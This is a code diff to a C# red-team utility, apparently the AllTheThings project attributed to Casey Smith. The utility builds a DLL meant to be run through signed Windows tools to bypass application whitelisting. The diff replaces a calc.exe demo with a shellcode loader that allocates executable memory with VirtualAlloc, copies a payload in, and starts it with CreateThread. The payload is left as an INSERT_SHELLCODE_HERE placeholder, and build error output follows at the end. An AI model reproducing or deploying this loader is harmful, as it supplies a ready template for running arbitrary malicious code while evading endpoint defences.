@@ -1,12 +1,10 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.Reflection;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.EnterpriseServices;
 using RGiesecke.DllExport;
-
-
 
 /*
 Author: Casey Smith, Twitter: @subTee
@@ -57,11 +55,39 @@ public class Program
 
 public class Thing0
 {
+    private static UInt32 MEM_COMMIT = 0x1000;
+    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+    [DllImport("kernel32")]
+    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+      UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread(
+      UInt32 lpThreadAttributes,
+      UInt32 dwStackSize,
+      UInt32 lpStartAddress,
+      IntPtr param,
+      UInt32 dwCreationFlags,
+      ref UInt32 lpThreadId
+      );
+    [DllImport("kernel32")]
+    private static extern UInt32 WaitForSingleObject(
+      IntPtr hHandle,
+      UInt32 dwMilliseconds
+      );
     public static void Exec()
     {
-        ProcessStartInfo startInfo = new ProcessStartInfo();
-        startInfo.FileName = "calc.exe";
-        Process.Start(startInfo);
+        /* length: 555 bytes */
+        byte[] shellcode = new byte[] { INSERT_SHELLCODE_HERE };
+
+
+        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        Marshal.Copy(shellcode, 0, (IntPtr) (funcAddr), shellcode.Length);
+		IntPtr hThread = IntPtr.Zero;
+        UInt32 threadId = 0;
+        IntPtr pinfo = IntPtr.Zero;
+        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
     }
 }
 
@@ -130,3 +156,11 @@ class Exports
    
 
 }
+
+/*
+Build errors:
+
+Severity	Code	Description	Project	File	Line	Suppression State
+Error		The "DllExportAppDomainIsolatedTask" task could not be instantiated from "C:\Users\lopi\Downloads\AllTheThings-master\AllTheThings-master\packages\UnmanagedExports.1.2.7\tools\RGiesecke.DllExport.MSBuild.dll". Could not load file or assembly 'RGiesecke.DllExport.MSBuild, Version=1.2.7.38851, Culture=neutral, PublicKeyToken=8f52d83c1a22df51' or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x80131515)	AllTheThings			
+Error		The "DllExportAppDomainIsolatedTask" task has been declared or used incorrectly, or failed during construction. Check the spelling of the task name and the assembly name.	AllTheThings			
+*/
